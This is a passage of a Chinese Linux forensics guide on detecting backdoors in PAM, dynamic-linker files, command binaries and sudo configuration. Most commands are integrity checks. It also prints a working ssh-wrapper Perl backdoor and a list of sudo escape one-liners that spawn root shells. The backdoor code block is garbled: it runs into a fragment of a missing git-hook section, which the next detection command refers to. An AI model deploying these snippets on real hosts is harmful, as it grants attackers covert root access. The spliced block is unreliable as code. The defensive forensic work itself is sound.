rpm -V `rpm -qf /etc/pam.d/system-auth`
```
（2）	源码修改并替换库文件，从而实现后门植入。
下面两篇文章中，作者分别实现了这种方式的后门植入。
Debian:https://www.cnblogs.com/adhzl/p/12098397.html
RHEL:https://xz.aliyun.com/t/7902
取证的过程分为以下几步：
1.	确定pam版本。rpm -qa | grep pam（或，dpkg -l | grep pam）
2.	下载对应版本源码。http://www.linux-pam.org/library/
3.	编译。（./configure && make）
4.	比较so文件散列值。
5.	分析异常so文件。
pam对大多数人而言可能比较生疏，这里有一些文章可以看看。
[1] Linux下PAM模块学习总结https://www.cnblogs.com/kevingrace/p/8671964.html
#### 1.5.2 /etc/ld.so.cache
/etc/ld.so.cache可以认为是程序的动态链接库字典，需要动态链接的程序会在系统内的动态加载器的帮助下读取/etc/ld.so.cache进而获得要用到的库文件。因而攻击者通过篡改该文件的内容，可以实现插入后门劫持程序运行的效果。这一技术在一些rootkit中常被使用。
检查方式是确定库文件的归属，通过下载对应版本的安装包或使用包管理器检查该库文件是否被篡改。
（1）下面的例子中使用包管理器检查某库文件。
```shell
#以debian下某库文件libBLT为例
cat /etc/ld.so.cache|tr '\0' '\n' |grep libBLT
ls -il /lib/libBLT.2.5.so.8.6 #获得inode
dkpg -S /usr/lib/libBLT.2.5.so.8.6 #获得二进制所属的包
dpkg -V tk8.6-blt2.5 #dpkg自检
#RHEL下
rpm -qf $filename
rpm -V $package
```
（2）下面的例子中通过比对官方包散列值来检查某库文件。
Debian系：
```shell
apt-get download xxx					#只下载
dpkg -X ./xxx.deb extract				#解压到extract目录
```
RHEL系：
```shell
yum install --downloadonly --downloaddir=/tmp/ XXX	#只下载
rpm2cpio xxx.rpm | cpio -div						#解压到当前目录
```
将待分析的so文件与解压后得到的文件使用md5sum比对散列值。
#### 1.5.3 /etc/ld.so.preload
网上不少文章提到该库文件，但看了一下本人的好几套环境上都没有该配置文件，因此真实性不做保证。这里留下来只是作为以防万一。
该配置文件作用与LD_PRELOAD类似，帮助程序预先加载一些库文件，内容与/etc/ld.so.cache。
因此，排查方法与/etc/ld.so.cache类似，使用包管理器确定其中的库文件来源并检查库文件是否被篡改。
### 1.6 篡改命令文件
篡改文件有两类常见的手法，一类是用含有后门逻辑的脚本文件替换掉命令文件，一类通过修改文件源码再编译。
使用包管理器检查能检查通过包管理器安装的程序。对于不支持包管理检查的文件或系统，发现脚本类替换相对容易，但发现源码修改再编译的后门则比较困难。
#### 1.6.1 包管理器自检
```shell
RHEL：rpm -aV
Debian：dpkg -V
```
这种方式依赖系统内包管理器可正常工作的情况。同时还要求被查的软件或二进制是采用源安装方式。如果采用pip，源码编译等方式进行安装，那就发现不了。
#### 1.6.2 检查脚本文件
使用下面给出的命令能快速检查常用程序目录下的脚本是否属于被篡改的脚本，如果包管理没有识别到该脚本的归属，单独查看内容进行分析即可，不常见的命令可以不用管。
```shell
# Debian:
find /usr/*bin /usr/local/*bin -type f -exec file {} \; |grep -v ELF|awk -F: '{print $1}'|xargs dpkg -S|awk -F: '{print $1}'|dpkg -V
# RHEL:
find /usr/*bin /usr/local/*bin -type f -exec file {} \; | grep -v ELF|awk -F: '{print $1}'|xargs rpm -qf|sort -n|uniq|xargs rpm -V
```
#### 1.6.3 检查ELF文件
（1）文件校验
实际场景下很少做这种检查，因为这种方法难以在取证场景下大量快速的展开，消耗时间与人力代价很大。
下面以一个OpenSSH后门排查为例。
首先确定二进制归属与版本：
```shell
dpkg -S /usr/sbin/sshd
dpkg -l openssh-server
(RHEL下对应于rpm -qf /usr/sbin/sshd结果直接包含版本号)
```
接着去开源社区搜一下，下载对应的deb包或rpm包、bin包。通过解压或执行的方式获得其中的二进制文件，算一遍散列值进行比对。
```shell
# Debian-deb：
dpkg -X ./xxx.deb extract	#解压到extract目录
dpkg -i ./xxx.deb			#安装该deb包
# RHEL-rpm：
rpm2cpio xxx.rpm | cpio -div	#解压到当前目录
rpm -i xxx.rpm			#安装该rpm包
# bin文件：
chmod +x xxx.bin; ./xxx.bin
```
这类文件比较特殊，可以在虚拟机里面安装后获得二进制，再算散列值。
（2）进程分析
这种排查方式的代价更高，同时可能需要沙箱环境。如果这种进程分析搞不定可能还需要文件逆向分析。
以进程分析OpenSSH后门为例。starce -ff -p $sshd_pid可以捕获到的正常的SSH登录中抓到的账户名及密码。如果OpenSSH-Server被篡改了，那么在该部分往后应该会有读写文件或创建socket外发的操作，具体的操作取决于攻击者的手段与目的（窃取型的可以直接写到本地也可以创建socket外发，口令鉴权绕过的除了硬编码口令应该也会存在其他绕过手段）。实际操作起来还会有很多问题，时间代价与精力代价都很高。
下面是一些此类后门的相关文章。
https://www.cnblogs.com/bigdevilking/p/9535427.html
https://www.cnblogs.com/jouny/p/4688194.html
https://www.freebuf.com/news/153364.html
https://www.cnblogs.com/croso/p/5280783.html
https://www.moonsec.com/archives/1720
（3）逆向工程
略。
#### 1.6.4 条件触发型后门
在正常使用操作中，用户无法感知，只有满足一定条件下才能触发后门逻辑的后门。检查的重点在于文件是否被篡改。有以下几种方式能够帮助检查：1.包管理器自检；2.md5sum比对；3.查看文件内容。
下面是一个典型ssh-wrapper后门的形式。此后门要求连接ssh的源端口满足指定的条件就能出发任意密码登录。
```shell
cd /usr/sbin
mv sshd ../bin
vi sshd
>>>>>
#!/usr/bin/perl
exec"/bin/sh"if(getpeername(STDIN)=~/^..4A/);
exec{"/usr/bin/sshd"}"/usr/sbin/sshd",@ARGV;
:1 &" > .git/hooks/pre-commit
chmod +x .git/hooks/pre-commit
Xnest:1
```
排查方式：所有本地的仓库内是否含有该文件及xterm关键字。
```shell
find / -name .git -exec grep -nr xterm {} \; 2>/dev/null
```
## 2 提权类后门排查
提权后门的取证在实际场合下意义不大。
一般来说攻击者具备提权为root的能力后都会直接在root权限下做持久化，以免每一次登录都要走一遍提权流程很麻烦。
### 2.1 suid shell
方法就是检查所有属主的x位被置为s的文件。检查方式是使用包管理器检查或二进制逆向的方式检查所有输出的结果。
find / -perm -4000 -uid 0 2>/dev/null
### 2.2 sudo配置不当-受限命令绕过
部分自带参数执行shell命令的命令如果经sudo配置下发给普通用户，普通用户可以用该参数提权为root。但在实际场景下基本遇不到，即便sudo的配置存在该问题，如果历史记录没记录到就无法取证该事件。
这种场景下sudo配置文件常常添加了形如如下的配置：
```shell
testme ALL=(ALL) NOPASSWD: /usr/bin/vi
apache ALL=(root) NOPASSWD:/usr/bin/zip
```
除了上面的命令vi与zip以外，还包括很多命令：
```shell
tar/more/less/man/ftp/python/vim/find/strace/git/passwd/awk
```
对应攻击者进行利用的方式：
```
sudo zip ./7.zip /tmp -T --unzip-command="sh -c /bin/bash"
sudo tar cf /dev/null test.tar --checkpoint=1 --checkpoint-action=exec=/bin/bash
sudo more /tmp/a.txt ; !/bin/bash
sudo less /tmp/a.txt; !/bin/bash
sudo man ssh; !/bin/bash
sudo ftp; !/bin/bash
sudo vim -c '!sh'
sudo find /bin/ -name ls -exec '/bin/bash' \;
sudo strace -o /dev/null /bin/bash
echo "os.execute('/bin/bash')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse
sudo git help status;!/bin/bash
sudo passwd
sudo awk 'BEGIN{system("/bin/bash")}'
sudo /usr/bin/python -c 'import pty;pty.spawn("/bin/bash")'
```
### 2.3 目录或文件与进程的属主不一致导致提权
由root等高权限用户周期性调用执行的文件 被部署在其他用户的家目录下（或该文件的属主为其他用户时），则当该用户失陷时，攻击者可以篡改该文件的内容，诱导root执行高风险的操作。
实际场景下很难取证，因此不做展开。